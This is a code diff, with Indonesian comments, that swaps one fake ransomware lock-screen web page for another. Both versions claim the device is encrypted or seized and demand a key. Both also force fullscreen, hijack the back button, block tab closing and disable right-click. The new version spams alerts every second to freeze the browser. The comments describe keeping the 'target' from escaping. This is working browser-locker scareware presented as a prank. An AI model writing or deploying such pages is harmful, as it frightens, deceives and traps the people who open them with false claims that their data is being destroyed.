@@ -2,62 +2,99 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SISTEM CRITICAL - LEXC HACKING</title>
+    <title>TERMINAL_BYPASS_v1.0</title>
     <style>
-        body { background:#000; color:#f00; font-family:monospace; height:100vh; margin:0; overflow:hidden; display:flex; justify-content:center; align-items:center; flex-direction:column; user-select:none; }
-        .box { border:2px solid #f00; padding:20px; text-align:center; background:rgba(30,0,0,0.9); box-shadow:0 0 30px #f00; width:80%; }
-        input { background:#111; border:1px solid #f00; color:#f00; padding:10px; width:80%; margin:10px 0; text-align:center; font-size:18px; }
-        button { background:#f00; color:#000; border:none; padding:10px 20px; font-weight:bold; width:85%; cursor:pointer; }
-        #status { font-size:10px; margin-top:10px; }
+        body {
+            background-color: black;
+            color: #00FF00;
+            font-family: 'Courier New', Courier, monospace;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+            text-shadow: 0 0 5px #00FF00;
+        }
+        #console {
+            width: 80%;
+            border: 1px solid #00FF00;
+            padding: 20px;
+            background: rgba(0, 20, 0, 0.9);
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
+        }
+        input {
+            background: transparent;
+            border: none;
+            border-bottom: 2px solid #00FF00;
+            color: #00FF00;
+            font-size: 1.2em;
+            outline: none;
+            width: 200px;
+            text-align: center;
+        }
+        .warning { color: red; font-weight: bold; animation: blink 0.5s infinite; }
+        @keyframes blink { 50% { opacity: 0; } }
     </style>
 </head>
-<body onclick="forceStart()">
-    <div class="box">
-        <h1 style="animation: blink 0.5s infinite">SYSTEM LOCKED</h1>
-        <p>PERANGKAT TELAH DIKUASAI LEXC HACKING</p>
-        <p>MASUKKAN KUNCI UNTUK MEMBUKA:</p>
-        <input type="password" id="key" placeholder="*****">
-        <button onclick="checkKey()">UNLOCK DEVICE</button>
-        <div id="status">ENCRYPTING_FILES... 98%</div>
+<body onclick="startPrank()">
+
+<div id="console">
+    <h2>[ SYSTEM: OMEGA_CORE_LOCKED ]</h2>
+    <p>> STATUS: ENCRYPTED BY SILENT REQUIEM</p>
+    <p>> ACCESS: RESTRICTED</p>
+    <br>
+    <div id="login-area">
+        <p>ENTER ACCESS KEY TO BYPASS:</p>
+        <input type="text" id="keyInput" autocomplete="off">
+        <button onclick="checkKey()" style="background:#00FF00; color:black; border:none; cursor:pointer;">EXECUTE</button>
     </div>
+    <div id="msg"></div>
+</div>
 
-    <script>
-        const PASS = "MAMAZ2026"; // Kunci VVIP lu
+<audio id="scarySound" loop>
+    <source src="https://www.soundjay.com/buttons/beep-01a.mp3" type="audio/mpeg">
+</audio>
 
-        function forceStart() {
-            // Paksa Fullscreen biar tombol navigasi HP sembunyi!
-            let el = document.documentElement;
-            if (el.requestFullscreen) el.requestFullscreen();
-            else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
-            
-            // Spam history sebrutal mungkin tiap 10 milidetik
-            setInterval(() => {
-                history.pushState(null, null, location.href);
-            }, 10);
+<script>
+    function startPrank() {
+        // Paksa Fullscreen biar target gak bisa kabur gampang
+        let elem = document.documentElement;
+        if (elem.requestFullscreen) { elem.requestFullscreen(); }
+        
+        // Anti-Right Click
+        document.addEventListener('contextmenu', event => event.preventDefault());
+    }
+
+    function checkKey() {
+        let key = document.getElementById('keyInput').value;
+        let audio = document.getElementById('scarySound');
+        let msg = document.getElementById('msg');
+
+        if (key === "LeaCD") {
+            msg.innerHTML = "<p class='warning'>[!] ACCESS GRANTED. INITIALIZING SYSTEM PURGE...</p>";
+            audio.play();
+            lockTarget();
+        } else {
+            msg.innerHTML = "<p style='color:orange;'>[!] INVALID KEY. TRACE INITIALIZED.</p>";
         }
+    }
 
-        function checkKey() {
-            if (document.getElementById("key").value === PASS) {
-                alert("AKSES DITERIMA. MENGEMBALIKAN SISTEM...");
-                window.location.href = "https://www.google.com"; // Mental keluar
-            } else {
-                alert("KUNCI SALAH! KERNEL AKAN DIHAPUS!");
-                // Bikin browser lag kalo salah
-                for(let i=0; i<1000; i++) { console.log("FREEZING..."); }
-            }
-        }
+    function lockTarget() {
+        // Simulasi nahan target
+        setInterval(function() {
+            alert("SYSTEM FAILURE: THE VOID IS CONSUMING YOUR DATA. DO NOT SHUT DOWN.");
+            window.onbeforeunload = function() { return "You cannot leave The Void."; };
+        }, 1000); // Bakal spam alert tiap detik, bikin browser beku
+    }
 
-        // Blokir tombol Back secara paksa
-        window.onpopstate = function() {
-            history.pushState(null, null, location.href);
-            alert("PERINGATAN: JANGAN MENCOBA KELUAR ATAU HP CRASH!");
-        };
+    // Blokir tombol Back
+    history.pushState(null, null, location.href);
+    window.onpopstate = function () {
+        history.go(1);
+    };
+</script>
 
-        // Cegah tutup tab (berfungsi di beberapa browser)
-        window.onbeforeunload = function() {
-            return "SISTEM SEDANG DIKUNCI!";
-        };
-    </script>
 </body>
 </html>
